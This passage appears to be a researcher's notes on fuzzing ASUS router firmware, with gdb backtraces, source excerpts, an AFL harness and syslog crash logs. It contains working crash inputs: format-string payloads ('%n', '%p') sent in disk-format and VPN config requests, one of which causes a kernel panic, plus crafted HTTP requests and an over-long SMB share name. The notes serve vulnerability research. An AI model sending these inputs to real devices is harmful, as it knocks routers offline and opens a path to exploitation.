        pattern = 0xfffec7cc ""
        asp = 0x0
        asp_end = 0x0
        key = 0x0
        key_end = 0x0
        start_pat = <optimized out>
        end_pat = <optimized out>
        lang = 0x1098a0 "EN"
        fp = 0x108150
        ret = <optimized out>
        read_len = <optimized out>
        len = <optimized out>
        no_translate = 1
        kw = {len = 0, tlen = 0, idx = 0x0, buf = 0x0}
        current_lang = <optimized out>
        root = 0x1099d8
#2  0x00019c5c in handle_request ()
No symbol table info available.
#3  0x00016ef8 in main ()
No symbol table info available.
```

Sadly no additional info comes from the other crash after enabling debug symbols. Looking at where the decode call comes from, ej.c:309

ej.c:298
```C
#ifdef TRANSLATE_ON_FLY
	// Load dictionary file
	lang = nvram_safe_get("preferred_lang");
	if(!check_lang_support(lang)){
		lang = nvram_default_get("preferred_lang");
		nvram_set("preferred_lang", lang);
	}

	char *current_lang;
	struct json_object *root = json_object_new_object();

	do_json_decode(root); // Line 309
	if ((current_lang = get_cgi_json("current_lang", root)) != NULL){
		if (load_dictionary (current_lang, &kw)){
			no_translate = 0;
		}
	}
	else{
		if (load_dictionary (lang, &kw)){
			no_translate = 0;
		}
	}
	if (root) json_object_put(root);
#endif  //defined TRANSLATE_ON_FLY
```

Cool! So the crash occurs from `do_json_decode(root);` not sure exactly WHY yet but that's OK, can figure that out. I assume this function isn't expecting a numeric value as `root`.

So, what's `do_json_decode()` do? Well, I only see it referenced in `ej.c`

`45: extern int do_json_decode(struct json_object *root);`

`*root` is defined as: `struct json_object *root = json_object_new_object();`
```
# grep -R "json_object_new_object" ../* 2<&-
../src/router/arm-glibc/stage/usr/include/json-c/json_object.h:extern struct json_object* json_object_new_object(void);
[...]
```

what is it?

`json_object_new_object: /release/src-rt-5.02L.07p2axhnd/bcmdrivers/broadcom/net/wl/impl69/main/components/opensource/jsonc/json_object.h`
```C
/* object type methods */

/** Create a new empty object with a reference count of 1.  The caller of
 * this object initially has sole ownership.  Remember, when using
 * json_object_object_add or json_object_array_put_idx, ownership will
 * transfer to the object/array.  Call json_object_get if you want to maintain
 * shared ownership or also add this object as a child of multiple objects or
 * arrays.  Any ownerships you acquired but did not transfer must be released
 * through json_object_put.
 *
 * @returns a json_object of type json_type_object
 */
extern struct json_object* json_object_new_object(void);
```
exists in the source:

```bash
$ find ../ -name json_object.c
../src-rt-5.02axhnd/bcmdrivers/broadcom/net/wl/impl51/main/components/opensource/jsonc/json_object.c
../src/router/libfastjson/json_object.c
../src/router/json-c/json_object.c
../src-rt-5.04axhnd.675x/bcmdrivers/broadcom/net/wl/impl87/main/components/opensource/jsonc/json_object.c
../src-rt-5.02L.07p2axhnd/bcmdrivers/broadcom/net/wl/impl69/main/components/opensource/jsonc/json_object.c
```

json_object.c
```C
[...]
struct json_object* json_object_new_object(void)
{
  struct json_object *jso = json_object_new(json_type_object);
  if(!jso) return NULL;
  jso->_delete = &json_object_object_delete;
  jso->_to_json_string = &json_object_object_to_json_string;
  jso->o.c_object = lh_kchar_table_new(JSON_OBJECT_DEF_HASH_ENTRIES,
					NULL, &json_object_lh_entry_free);
  return jso;
}
```

can at least begin troubleshooting with trust `printf`s
```C struct json_object* json_object_new_object(void)
{
  printf("Enter\r\n", 9);
  struct json_object *jso = json_object_new(json_type_object);
  printf("After struct\r\n", 16);
  if(!jso) return NULL;
  printf("Past if\r\n", 11);
  jso->_delete = &json_object_object_delete;
  printf("delete\r\n", 11);
  jso->_to_json_string = &json_object_object_to_json_string;
  printf("_to_json_string\r\n", 19);
  jso->o.c_object = lh_kchar_table_new(JSON_OBJECT_DEF_HASH_ENTRIES,
					NULL, &json_object_lh_entry_free);
  printf("o.c_object\r\n", 14);
  return jso;
}
```

TODO: COME BACK TO THIS

### "known_crash" analysis

So while looking at my known and "new" (AFL generated) crashes I was doing the above triage and ended up in the bcmdrivers to chase down the behavior. 

I wanted to continue chasing down the root cause of the OG crash I had, so I recompiled with `CFLAGS += -g`, which seemed to get the debug symbols created. For some reason just adding -g to the gcc command wasn't sufficient.

The `known_crash` crash looks like this now:

```
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230104-203755_3086479.core
Reading symbols from usr/sbin/httpd...
[New LWP 3086479]

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Core was generated by `
'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00043fa4 in do_json_decode (root=0x1049d8) at web.c:11576
11576                   json_object_object_foreach(tmp_obj, key, val){
(gdb) bt full
#0  0x00043fa4 in do_json_decode (root=0x1049d8) at web.c:11576
        entrykey = <optimized out>
        entry_nextkey = <optimized out>
        key = 0x0
        val = 0x0
        name_tmp = '\000' <repeats 49 times>
        tmp_obj = 0x104e58
        copy_json = 0x0
#1  0x0001af94 in do_ej ()
No symbol table info available.
#2  0x000199f8 in handle_request ()
No symbol table info available.
#3  0x00016c84 in main ()
No symbol table info available.
```
 
install pwndbg, lol
```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

### Router app

Having a hard time proxying traffic from the app, packet captured on the pfsense from my phone, gave me a bit of info

Noted this user agent `User-Agent: asusrouter-Windows-DUTUtil-1.0.1.278`

```
➜  /tmp tcpdump -r pcap.pcap -X port 80
[...]
15:41:53.287671 IP 192.168.1.14.52456 > pfSense.home.local.http: Flags [P.], seq 1:122, ack 1, win 2058, options [nop,nop,TS val 1340893486 ecr 1213537481], length 121: HTTP: GET /appGet_image_path.cgi HTTP/1.1
        0x0000:  4500 00ad 0000 4000 4006 b6eb c0a8 010e  E.....@.@.......
        0x0010:  c0a8 0101 cce8 0050 678d a3b1 80f6 d177  .......Pg......w
        0x0020:  8018 080a 8523 0000 0101 080a 4fec 692e  .....#......O.i.
        0x0030:  4855 1cc9 4745 5420 2f61 7070 4765 745f  HU..GET./appGet_
        0x0040:  696d 6167 655f 7061 7468 2e63 6769 2048  image_path.cgi.H
        0x0050:  5454 502f 312e 310d 0a48 6f73 743a 2031  TTP/1.1..Host:.1
        0x0060:  3932 2e31 3638 2e31 2e31 0d0a 4163 6365  92.168.1.1..Acce
        0x0070:  7074 3a20 2a2f 2a0d 0a75 7365 722d 4167  pt:.*/*..user-Ag
        0x0080:  656e 743a 2061 7375 7372 6f75 7465 722d  ent:.asusrouter-
        0x0090:  5769 6e64 6f77 732d 4455 5455 7469 6c2d  Windows-DUTUtil-
        0x00a0:  312e 302e 312e 3237 380d 0a0d 0a         1.0.1.278....
15:41:53.287685 IP pfSense.home.local.http > 192.168.1.14.52456: Flags [.], ack 122, win 513, options [nop,nop,TS val 1213537484 ecr 1340893486], length 0
        0x0000:  4500 0034 0000 4000 4006 b764 c0a8 0101  E..4..@.@..d....
        0x0010:  c0a8 010e 0050 cce8 80f6 d177 678d a42a  .....P.....wg..*
        0x0020:  8010 0201 8386 0000 0101 080a 4855 1ccc  ............HU..
        0x0030:  4fec 692e                                O.i.
15:41:53.287735 IP pfSense.home.local.http > 192.168.1.14.52456: Flags [P.], seq 1:401, ack 122, win 514, options [nop,nop,TS val 1213537484 ecr 1340893486], length 400: HTTP: HTTP/1.1 301 Moved Permanently
        0x0000:  4500 01c4 0000 4000 4006 b5d4 c0a8 0101  E.....@.@.......
        0x0010:  c0a8 010e 0050 cce8 80f6 d177 678d a42a  .....P.....wg..*
        0x0020:  8018 0202 8516 0000 0101 080a 4855 1ccc  ............HU..
        0x0030:  4fec 692e 4854 5450 2f31 2e31 2033 3031  O.i.HTTP/1.1.301
        0x0040:  204d 6f76 6564 2050 6572 6d61 6e65 6e74  .Moved.Permanent
        0x0050:  6c79 0d0a 5365 7276 6572 3a20 6e67 696e  ly..Server:.ngin
        0x0060:  780d 0a44 6174 653a 2054 6875 2c20 3035  x..Date:.Thu,.05
        0x0070:  204a 616e 2032 3032 3320 3230 3a34 313a  .Jan.2023.20:41:
        0x0080:  3533 2047 4d54 0d0a 436f 6e74 656e 742d  53.GMT..Content-
        0x0090:  5479 7065 3a20 7465 7874 2f68 746d 6c0d  Type:.text/html.
        0x00a0:  0a43 6f6e 7465 6e74 2d4c 656e 6774 683a  .Content-Length:
        0x00b0:  2031 3632 0d0a 436f 6e6e 6563 7469 6f6e  .162..Connection
        0x00c0:  3a20 6b65 6570 2d61 6c69 7665 0d0a 4c6f  :.keep-alive..Lo
        0x00d0:  6361 7469 6f6e 3a20 6874 7470 733a 2f2f  cation:.https://
        0x00e0:  3139 322e 3136 382e 312e 312f 6170 7047  192.168.1.1/appG
        0x00f0:  6574 5f69 6d61 6765 5f70 6174 682e 6367  et_image_path.cg
        0x0100:  690d 0a58 2d46 7261 6d65 2d4f 7074 696f  i..X-Frame-Optio
        0x0110:  6e73 3a20 5341 4d45 4f52 4947 494e 0d0a  ns:.SAMEORIGIN..
        0x0120:  0d0a 3c68 746d 6c3e 0d0a 3c68 6561 643e  ..<html>..<head>
        0x0130:  3c74 6974 6c65 3e33 3031 204d 6f76 6564  <title>301.Moved
        0x0140:  2050 6572 6d61 6e65 6e74 6c79 3c2f 7469  .Permanently</ti
        0x0150:  746c 653e 3c2f 6865 6164 3e0d 0a3c 626f  tle></head>..<bo
        0x0160:  6479 3e0d 0a3c 6365 6e74 6572 3e3c 6831  dy>..<center><h1
        0x0170:  3e33 3031 204d 6f76 6564 2050 6572 6d61  >301.Moved.Perma
        0x0180:  6e65 6e74 6c79 3c2f 6831 3e3c 2f63 656e  nently</h1></cen
        0x0190:  7465 723e 0d0a 3c68 723e 3c63 656e 7465  ter>..<hr><cente
        0x01a0:  723e 6e67 696e 783c 2f63 656e 7465 723e  r>nginx</center>
        0x01b0:  0d0a 3c2f 626f 6479 3e0d 0a3c 2f68 746d  ..</body>..</htm
        0x01c0:  6c3e 0d0a
```



#### api.asp?


#### login.cgi

Found a new crash

```http
GET /login.cgi HTTP/1.1
Host: 192.168.1.2
User-Agent: asusrouter-Windows-DUTUtil-1.0.1.278
```

Triage:

```bash
$ ulimit -c unlimited
$ chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/httpd crash3
[...]
nvram_get_buf: = "admin"
nvram_get_int: p_Setting
sem_get: Key: 414b0002
sem_get: Key: 414b0002
nvram_get_int: Unable to read key: /firmadyne/libnvram/p_Setting!
Segmentation fault (core dumped)
$ gdb-multiarch usr/sbin/httpd qemu_httpd_20230105-215542_3503814.core
[...]
pwndbg> bt full
#0  0xfef6d6a4 in strlen () from /home/tester/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/lib/libc.so.6
No symbol table info available.
#1  0x00034c40 in login_cgi (wp=0x103150, query=<optimized out>, path=<optimized out>, url=<optimized out>, arg=<optimized out>, webDir=<optimized out>, urlPrefix=<optimized out>) at web.c:19175
        authorization_t = <optimized out>
        authinfo = '\000' <repeats 499 times>
[...]
```

And, from source:

web.c:19169
```c
/* Is this the right user and password? */
if(nvram_match("http_username", authinfo) && compare_passwd_in_shadow(authinfo, authpass))
        auth_pass = 1;
if(!nvram_get_int("p_Setting")){
        if(strlen(authinfo) > 20)
                authinfo[20] = '\0';
        if(strlen(authpass) > 16)
                *(authpass+16) ='\0';
        if(nvram_match("http_username", authinfo) && compare_passwd_in_shadow(authinfo, authpass))
                auth_pass = 1;
}
```

seems boring, next


### apply.cgi

found another crash in apply.cgi, but it's another boring one, a null pointer exception due to not including the `current_page` POST param vvvv

request:
```
POST /apply.cgi HTTP/1.1
Host: 192.168.1.180
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Cookie: hwaddr=3C:7C:3F:53:C1:00; apps_last=; asus_token=GTySYitXojpulvj1oVADaysOOsFw6Ga; clickedItem_tab=0

action_mode=+Refresh+&SystemCmd=test
```

gdb:
```
#0  0xfef6cbf0 in strcmp () from /home/tester/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/lib/libc.so.6
No symbol table info available.
#1  0x00057e8c in apply_cgi (wp=0x103150, query=<optimized out>, path=<optimized out>, url=<optimized out>, arg=<optimized out>, webDir=<optimized out>, urlPrefix=<optimized out>) at web.c:11988
        system_cmd = 0xb13a8 <post_buf+32> "test"
        action_mode = <optimized out>
        action_para = <optimized out>
        current_url = 0x0
        config_name = <optimized out>
#2 ...
```

source:
web.c:11988
```c
if(!strcmp(current_url, "Main_Netstat_Content.asp") && (
        strncasecmp(system_cmd, "netstat", 7) == 0
```

BORING, NEXT


## smbd

Asus (maybe wrt as well?) uses samba 3.0.37, after pluggin in a USB drive and enabling the samba stuff I attempted to list a share and folder with a long filename:

```bash
➜  asus smbclient \\\\192.168.1.2\\testfolderaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_IO_TIMEOUT

^C
```

In the router's syslog I saw:

```
Jan  7 08:47:51 Samba Server: smb daemon is stoped
Jan  7 08:47:51 Samba Server: daemon is started
Jan  7 08:57:50 smbd[3138]: [2023/01/07 08:57:50.787570,  0] lib/util_str.c:532(safe_strcpy_fn)
Jan  7 08:57:50 smbd[3138]:   ERROR: string overflow by 1 (256 - 255) in safe_strcpy [testfolderaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]
```

Seems interesting, maybe I'll return to this


## infosvr

Another binary that had piqued my interest early on was named `infosvr`, and it listened on 9999/UDP. This bin is open sourced, and in my earlier poking around I had noticed traffic on 9999 was identical to many packets being sent and received by `cfg_server`

This bin seems *fairly* simple, or at least it seemed simple enough to get a packet passed to its `processPacket()` function. Running the emulated binary produces the following output periodically, some indication that my *actual* router and the emulated device are communicating:

```bash
$ chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/infosvr br0
...
nvram_get_int: Unable to read key: /firmadyne/libnvram/aae_enable!
AAE EnableAAE =0 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
nvram_get_buf: aae_deviceid
sem_get: Key: 419c0002
sem_get: Key: 419c0002
nvram_get_buf: = "3ffe510783a3f8e12c6e0bdf77c9168e"
AAE DeviceID =3ffe510783a3f8e12c6e0bdf77c9168e <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
```

I spent a bit of time editing the source and making a little py script to send some data to the emulated binary, this way I could get some easier to digest feedback and start understanding what's happening when it calls `recv` or similar.

infosvr.c
```c
int processReq(int sockfd)
{
...
        //Receive the complete PDU
        iRcv = RECV(sockfd , pdubuf , INFO_PDU_LENGTH , (struct sockaddr *)&from_addr , &fromlen  , 1);
        printf("Bytes: %d\r\n", iRcv);
        printf("pdubuf %s\r\n", pdubuf);

        if (iRcv != INFO_PDU_LENGTH) // INFO_PDU_LENGTH = 512
        {
        closesocket(sockfd);
        return (-1);
        }

        hdr = pdubuf;
        cli_port = ntohs(from_addr.sin_port);
        //_dprintf("[InfoSvr] Client Port: %d\n", cli_port);
        printf("%s\n", hdr);
        printf("%p\n", hdr);
        printf("processPacket enter\r\n");
        processPacket(sockfd, hdr, cli_port);
...
```

which produces the following output:
```
AAE DeviceID =3ffe510783a3f8e12c6e0bdf77c9168e <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
Bytes: 512
pdubuf



0xfffef2c4
processPacket enter
Bytes: 512
pdubuf
...
```

Definitely very cool. `processPacket` lives in `common.c` and accepts the socket fd, packet contents as `hdr` and the port. I left tcpdump running for a while to catch anything interesting on 9999/udp. Can strip the UDP headers out and just snag the data using wireshark, or `tcpdump -r file.pcap -x port 9999` etc and just manually copy the data.

### AFL

Converting the app to stdin took a couple changes, had a couple crashes after making changes, `processPacket` returns into some functions that call `sendTo`, so those need to be commented out

infosvr.c:120
```C
// Get file from stdin instead

const char *finput = NULL;
FILE *fp;
finput = argc[argv - 1];
char		*hdr;
char		pdubuf[INFO_PDU_LENGTH]; //512

memset(pdubuf,0,sizeof(pdubuf));
fp = fopen(finput, "r");	

/* copy the file into the buffer */
fread( pdubuf , 512, 1 , fp); // Copy FP (*file) contents buf into char[]
processPacket(fp, pdubuf, 9999);

printf("done processPacket\r\n", 23);
exit(1);
```

Packet structures / definitions are in:
- router/shared/iboxcom.h

```
//Packet Type Section
#define NET_SERVICE_ID_BASE	        (10)
#define NET_SERVICE_ID_LPT_EMU	    (NET_SERVICE_ID_BASE + 1)
#define NET_SERVICE_ID_IBOX_INFO	(NET_SERVICE_ID_BASE + 2)


//Packet Type Section
#define NET_PACKET_TYPE_BASE	    (20)
#define NET_PACKET_TYPE_CMD	        (NET_PACKET_TYPE_BASE + 1)
#define NET_PACKET_TYPE_RES	        (NET_PACKET_TYPE_BASE + 2)

//Command ID Section
//#define NET_CMD_ID_BASE		30
//#define NET_CMD_ID_GETINFO	NET_CMD_ID_BASE + 1

enum  NET_CMD_ID
{                               // Decimal      Hexadecimal
	NET_CMD_ID_BASE = 30,       //  30              0x1E
	NET_CMD_ID_GETINFO,         //  31              0x1F
	NET_CMD_ID_GETINFO_EX,      //  32              0x20
	NET_CMD_ID_GETINFO_SITES,   //  33              0x21
	NET_CMD_ID_SETINFO,         //  34              0x22
	NET_CMD_ID_SETSYSTEM,       //  35              0x23
	NET_CMD_ID_GETINFO_PROF,    //  36              0x24
	NET_CMD_ID_SETINFO_PROF,    //  37              0x25
    	NET_CMD_ID_CHECK_PASS,      //  38              0x26
```

Shortened the payload that's working, #2, to just 
`0C 15 1F`

Still triggers the correct path, added print statements to `processPacket` after each switch case:

```C
case NET_CMD_ID_GETINFO:
        printf("\r\nNET_CMD_ID_GETINFO\r\n");
        ...
```

Running it:
(`| tee` supresses nvram output :thumbsup)
```
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/infosvr infosvr-input/2-modified | tee
...
nvram_get_buf: = "3ffe510783a3f8e12c6e0bdf77c9168e"

NET_CMD_ID_GETINFO
AAE EnableAAE =0 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
AAE DeviceID =3ffe510783a3f8e12c6e0bdf77c9168e <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
done processPacket
```

Making a dictionary of each "opcode" and other goodies from the `iboxcom.h` header file

Packet Structure:

`0C 15 1F`

iboxcom.h
```C
//Use For Network Communication Protocol

//Packet Type Section
#define NET_SERVICE_ID_BASE	        (10)
#define NET_SERVICE_ID_LPT_EMU	    (NET_SERVICE_ID_BASE + 1)
#define NET_SERVICE_ID_IBOX_INFO	(NET_SERVICE_ID_BASE + 2)


//Packet Type Section
#define NET_PACKET_TYPE_BASE	    (20)
#define NET_PACKET_TYPE_CMD	        (NET_PACKET_TYPE_BASE + 1)
#define NET_PACKET_TYPE_RES	        (NET_PACKET_TYPE_BASE + 2)

//Command ID Section
//#define NET_CMD_ID_BASE		30
//#define NET_CMD_ID_GETINFO	NET_CMD_ID_BASE + 1

enum  NET_CMD_ID
{                               // Decimal      Hexadecimal
	NET_CMD_ID_BASE = 30,       //  30              0x1E
	NET_CMD_ID_GETINFO,         //  31              0x1F
	NET_CMD_ID_GETINFO_EX,      //  32              0x20
	NET_CMD_ID_GETINFO_SITES,   //  33              0x21
	NET_CMD_ID_SETINFO,         //  34              0x22
	NET_CMD_ID_SETSYSTEM,       //  35              0x23
	NET_CMD_ID_GETINFO_PROF,    //  36              0x24
	NET_CMD_ID_SETINFO_PROF,    //  37              0x25
    	NET_CMD_ID_CHECK_PASS,      //  38              0x26
#ifdef BTN_SETUP
	NET_CMD_ID_SETKEY_EX,	    //  39		0x27
	NET_CMD_ID_QUICKGW_EX,	    //  40 		0x28
	NET_CMD_ID_EZPROBE,	    //  41		0x29
#endif
	NET_CMD_ID_MANU_BASE=50,    //  50		0x32
	NET_CMD_ID_MANU_CMD,	    //  51		0x33
	NET_CMD_ID_GETINFO_MANU,    //  52              0x34
	NET_CMD_ID_GETINFO_EX2,     //  53              0x35
	NET_CMD_ID_FIND_CAP,     //  54              0x36
	NET_CMD_ID_MAXIMUM
};
```

So, with the above known we can figure this packet header pretty easily:
`0C` == 12 == `NET_SERVICE_ID_IBOX_INFO`
`15` == 21 == `NET_PACKET_TYPE_CMD`
`1F` == 31 == `NET_CMD_ID_GETINFO`

Next, created a directory of 512 byte hex files with different headers

Sadly there's just not a lot of functionality in this binary :/


## disk_monitor

Found a crash in disk_monitor:

```
POST /start_apply.htm HTTP/1.1
Host: 192.168.1.2
Content-Length: 186
Origin: http://192.168.1.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Cookie: hwaddr=3C:7C:3F:53:C1:00; apps_last=; clickedItem_tab=0; asus_token=E1pZ1zgYygoSNU8TFgr7XyZReQG5Tu8
Connection: close

next_page=%2Fdevice-map%2Fdisk_format.asp&action_mode=apply&action_script=start_diskformat&action_wait=1&diskformat_file_system=%25n&diskformat_label=test&disk_name=test&disk_system=tfat
```

`%25n` in diskformat_file_system

Syslog:

```
Mar 14 16:23:12 rc_service: httpd 1438:notify_rc start_diskformat
Mar 14 16:23:12 disk_monitor: Format manually...
Mar 14 16:23:12 disk monitor: start...
Mar 14 16:23:12 iTunes: daemon is stoped
Mar 14 16:23:12 FTP Server: daemon is stopped
Mar 14 16:23:12 Samba Server: smb daemon is stopped
Mar 14 16:23:16 Timemachine: daemon is stoped
Mar 14 16:23:16 disk monitor: unmount partition
Mar 14 16:23:16 disk monitor: format partition
Mar 14 16:23:16 avahi-daemon[3477]: WARNING: No NSS support for mDNS detected, consider installing nss-mdns!
Mar 14 16:23:16 kernel: CPU: 2 PID: 1481 Comm: disk_monitor Tainted: P           O    4.1.51 #4
Mar 14 16:23:16 kernel: Hardware name: Broadcom-v8A (DT)
Mar 14 16:23:16 kernel: task: ffffffc02ff3ebc0 ti: ffffffc02b9fc000 task.ti: ffffffc02b9fc000
Mar 14 16:23:16 kernel: PC is at 0xf6cf09c8
Mar 14 16:23:16 kernel: LR is at 0xf6d26248
Mar 14 16:23:16 kernel: pc : [<00000000f6cf09c8>] lr : [<00000000f6d26248>] pstate: 60070010
Mar 14 16:23:16 kernel: sp : 00000000ffa2c6d0
Mar 14 16:23:16 kernel: x12: 00000000002ebdf4 
Mar 14 16:23:16 kernel: x11: 00000000ffa2cbc4 x10: 0000000000000000 
Mar 14 16:23:16 kernel: x9 : 00000000f6dea7a8 x8 : 00000000f6dec000 
Mar 14 16:23:16 kernel: x7 : 00000000f765f860 x6 : 0000000000000024 
Mar 14 16:23:16 kernel: x5 : 00000000ffa2cc8c x4 : 00000000002e86e8 
Mar 14 16:23:16 kernel: x3 : 0000000000000001 x2 : 00000000ffa2cc84 
Mar 14 16:23:16 kernel: x1 : 00000000f6cefb34 x0 : 0000000000000024 
Mar 14 16:23:17 avahi-daemon[3477]: Alias name "RT-AX88U" successfully established.
Mar 14 16:23:46 bsd: bsd: Sending act Frame to 58:ce:2a:4a:49:1c with transition target eth7 ssid 3c:7c:3f:53:c1:04
Mar 14 16:23:46 bsd: bsd: BSS Transit Response: ifname=eth6, event=156, token=1c, status=0, mac=3c:7c:3f:53:c1:04
Mar 14 16:23:46 bsd: bsd: BSS Transit Response: STA accept
```


## VPN Server Config

### 1

5/28/23

New crashes / format strings in the actual VPN config files. Advanced VPN Config, modify POST params:

Vulnerable parameters:
`vpn_server_cipher`
`vpn_server_digest`

Syslog Output:
```
May 28 10:29:16 rc_service: httpd 2726:notify_rc restart_openvpnd;restart_chpass;restart_samba
May 28 10:29:17 vpnserver1[7115]: OpenVPN 2.4.12 arm-buildroot-linux-gnueabi [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on May 15 2023
May 28 10:29:17 vpnserver1[7115]: library versions: OpenSSL 1.1.1n  15 Mar 2022, LZO 2.03
May 28 10:29:17 vpnserver1[7116]: WARNING: using --duplicate-cn and --client-config-dir together is probably not what you want
May 28 10:29:17 vpnserver1[7116]: NOTE: your local LAN uses the extremely common subnet address 192.168.0.x or 192.168.1.x.  Be aware that this might create routing conflicts if you connect to the VPN server from public locations such as internet cafes that use the same subnet.
May 28 10:29:17 vpnserver1[7116]: NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
May 28 10:29:17 vpnserver1[7116]: PLUGIN_INIT: POST /usr/lib/openvpn-plugin-auth-pam.so '[/usr/lib/openvpn-plugin-auth-pam.so] [openvpn]' intercepted=PLUGIN_AUTH_USER_PASS_VERIFY 
May 28 10:29:17 vpnserver1[7116]: Diffie-Hellman initialized with 2048 bit key
May 28 10:29:17 vpnserver1[7116]: Cipher AAAA0xe0c7d6000xffadc8c00xffadc not supported
May 28 10:29:17 vpnserver1[7116]: Exiting due to fatal error
```

### 2

More crashes / weird shit when submitting tainted certificates. Kernel panic!

Caused by including things like "%p%p%p%p" in the certificate config, breaks VPN again.

Request Param:
`vpn_crt_server1_ca=-----BEGIN+CERTIFICATE-----%25p%25p%25p%25p%25p[...]`

```
May  5 01:05:02 crashlog: <6>tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
May  5 01:05:02 crashlog: <6>IPv6: ADDRCONF(NETDEV_UP): tun21: link is not ready
May  5 01:05:02 crashlog: <6>IPv6: ADDRCONF(NETDEV_UP): tun21: link is not ready
May  5 01:05:02 crashlog: <6>device tun21 entered promiscuous mode
May  5 01:05:02 crashlog: <6>potentially unexpected fatal signal 11.
May  5 01:05:02 crashlog: <4>
May  5 01:05:02 crashlog: <4>CPU: 1 PID: 1 Comm: init Tainted: P           O    4.1.51 #4
May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
May  5 01:05:02 crashlog: <4>task: ffffffc03e85d440 ti: ffffffc03e860000 task.ti: ffffffc03e860000
May  5 01:05:02 crashlog: <4>PC is at 0xf6f22624
May  5 01:05:02 crashlog: <4>LR is at 0xf6c40fc0
May  5 01:05:02 crashlog: <4>pc : [<00000000f6f22624>] lr : [<00000000f6c40fc0>] pstate: 60070010
May  5 01:05:02 crashlog: <4>sp : 00000000ff956590
May  5 01:05:02 crashlog: <4>x12: 00000000f6f22618 
May  5 01:05:02 crashlog: <4>x11: 0000000000000003 x10: 0000000000000000 
May  5 01:05:02 crashlog: <4>x9 : 00000000ff957f6c x8 : 0000000000000000 
May  5 01:05:02 crashlog: <4>x7 : 000000000036ca48 x6 : 00000000ff956d90 
May  5 01:05:02 crashlog: <4>x5 : 0000000000000001 x4 : 0000000000000400 
May  5 01:05:02 crashlog: <4>x3 : 00000000000002e0 x2 : 00000000f6fab000 
May  5 01:05:02 crashlog: <4>x1 : 0000000000000001 x0 : 0000000000000000 
May  5 01:05:02 crashlog: <4>
May  5 01:05:02 crashlog: <0>Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
May  5 01:05:02 crashlog: <0>
May  5 01:05:02 crashlog: <4>CPU: 1 PID: 1 Comm: init Tainted: P           O    4.1.51 #4
May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
May  5 01:05:02 crashlog: <0>Call trace:
May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
May  5 01:05:02 crashlog: <4>[<ffffffc0005199e4>] panic+0xd8/0x220
May  5 01:05:02 crashlog: <4>[<ffffffc000095360>] complete_and_exit+0x0/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc00009617c>] do_group_exit+0x3c/0xd8
May  5 01:05:02 crashlog: <4>[<ffffffc0000a1198>] get_signal+0x260/0x4e8
May  5 01:05:02 crashlog: <4>[<ffffffc000086c94>] do_signal+0x194/0x4f8
May  5 01:05:02 crashlog: <4>[<ffffffc0000871ec>] do_notify_resume+0x64/0x70
May  5 01:05:02 crashlog: <2>CPU3: stopping
May  5 01:05:02 crashlog: <4>CPU: 3 PID: 0 Comm: swapper/3 Tainted: P           O    4.1.51 #4
May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
May  5 01:05:02 crashlog: <0>Call trace:
May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc03e8d7dc0 to 0xffffffc03e8d7ef0)
May  5 01:05:02 crashlog: <4>7dc0: d288f5e0 0000002d 00000000 00000080 3e8d7f10 ffffffc0 00370adc ffffffc0
